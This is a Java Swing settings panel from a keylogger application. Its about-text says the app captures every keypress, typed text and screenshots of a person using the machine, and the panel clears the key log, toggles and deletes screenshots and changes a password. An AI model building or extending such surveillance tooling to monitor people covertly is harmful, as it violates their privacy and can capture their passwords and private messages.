import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;


public class Settings extends JPanel implements ActionListener {

    private JButton button_clear_logs;
    private JButton button_enable_screenshots;
    private JButton button_disable_screenshots;
    private JButton button_clear_screenshots;
    private JButton button_change_password;
    private JButton button_change_email;

    static boolean delete_screenshot_enable=false; //clear_logger_file=false
    FilePermissions fp;

    public Settings(){
        setLayout(new FlowLayout());
        JTextArea about_text = new JTextArea();
        String text_about="This application has been developed to cater to the needs of those who need to keepa a tab on their systems "
                +", when accessed by some other person. Through this application, one can get the screenshots of the applications visited "
                +", and get the log file of all the keys which are being pressed and all the text being typed i.e., when the keylogger isn't disabled :P \n"
                +"Anyways, from this panel, you can change the settings of the keylogger upto certain extent...";

        about_text.setText(text_about);
        about_text.setWrapStyleWord(true);
        about_text.setFont(new Font("Comic sans MS", Font.BOLD, 16));
        about_text.setForeground(Color.ORANGE);
        about_text.setLineWrap(true);
        about_text.setColumns(60);
        about_text.setEditable(false);
        add(about_text);

        button_clear_logs = new JButton("CLEAR THE LOG");
        button_clear_logs.addActionListener(this);
        add(button_clear_logs);

        button_enable_screenshots = new JButton("ENABLE THE SCREENSHOTS");
        button_enable_screenshots.addActionListener(this);
        add(button_enable_screenshots);

        button_disable_screenshots = new JButton("DISABLE THE SCREENSHOTS");
        button_disable_screenshots.addActionListener(this);
        add(button_disable_screenshots);

        button_clear_screenshots = new JButton("DELETE THE SCREENSHOTS");
        button_clear_screenshots.addActionListener(this);
        add(button_clear_screenshots);

        button_change_password= new JButton("CHANGE THE PASSWORD");
        button_change_password.addActionListener(this);
        add(button_change_password);

        button_change_email = new JButton("CHANGE THE EMAIL");
        button_change_email.addActionListener(this);
        //add(button_change_email);
    }

    @Override
    public void actionPerformed(ActionEvent ae) {
        if(ae.getSource()==button_clear_logs){
            fp = new FilePermissions();
            File f=new File("lib/docs/Logger_Keys.txt");
            fp.GrantFilePermissions(f);
            //Loading load=new Loading(6);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            try {
                BufferedWriter bw =  new BufferedWriter(new FileWriter(f,false));
                PrintWriter pw = new PrintWriter(bw);
                pw.print("");
                pw.close();
                bw.close();

                bw =  new BufferedWriter(new FileWriter("lib/docs/Logger_keys.txt",true));
                pw = new PrintWriter(bw);
                pw.print("");
                pw.close();
                bw.close();
                //the above line re-enables the continous loggin up of the keys...

            } catch (IOException e) {
                e.printStackTrace();
            }
            finally{
                fp.RevokeFilePermissions(f);
            }
            JOptionPane.showMessageDialog(null,"The Key log file is now empty...");
        }
        else if(ae.getSource() == button_enable_screenshots){
            if(Main.enabled_ss==true)
                JOptionPane.showMessageDialog(null, "Screenshot feature is already enabled...");
            else Main.enabled_ss=true;
        }
        else if(ae.getSource() == button_disable_screenshots){
            if(Main.enabled_ss==false)
                JOptionPane.showMessageDialog(null, "Screenshot feature is already disabled...");
            else Main.enabled_ss=false;
        }
        else if(ae.getSource() == button_clear_screenshots){

            try {
                BufferedReader br = new BufferedReader(new FileReader("lib/docs/screenshot_serialno.txt"));
                int ctr = Integer.parseInt(br.readLine());
                br.close();

                BufferedWriter bw =  new BufferedWriter(new FileWriter("lib/docs/screenshot_serialno.txt",false));
                PrintWriter pw = new PrintWriter(bw);
                pw.println("0");
                pw.close();
                bw.close();
                delete_screenshot_enable=true;

                for(int i=1;i<=ctr;i++){
                    String filename = "lib/screenshots/screen_"+i+".png";
                    File f1 = new File(filename);
                    f1.delete();
                }

                //delete_screenshot_enable=true;
                ////new MainDialog(true);
                //SwingUtilities.updateComponentTreeUI(MainDialog.screenshotLog);

                //MainDialog.tabbedPane.

                //MainDialog.screenshotLog.repaint();
                //MainDialog.screenshotLog.revalidate();

                //frame1.repaint();
                //JFrame frame = newMainDialog
                //SwingUtilities.updateComponentTreeUI(new MainDialog());
                //MainDialog.screenshotLog.repaint();
            } catch (IOException e) {
                e.printStackTrace();
            }
            finally{
                //fp.RevokeFilePermissions(f);
            }
            try {
                Thread.sleep(600);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            JOptionPane.showMessageDialog(null,"There are no screenshots anymore...");
            saveScreenshot.number=0;
                System.out.println("Screenshot_serial number re-starting from : "+saveScreenshot.number);
        }
        else if(ae.getSource() == button_change_password){
            new Security().changePassword();
        }
        /*else if(ae.getSource() == button_change_email){
            new emailDialog("Changing the e-mail address").createUI_newEmail();
        }*/
    }
}
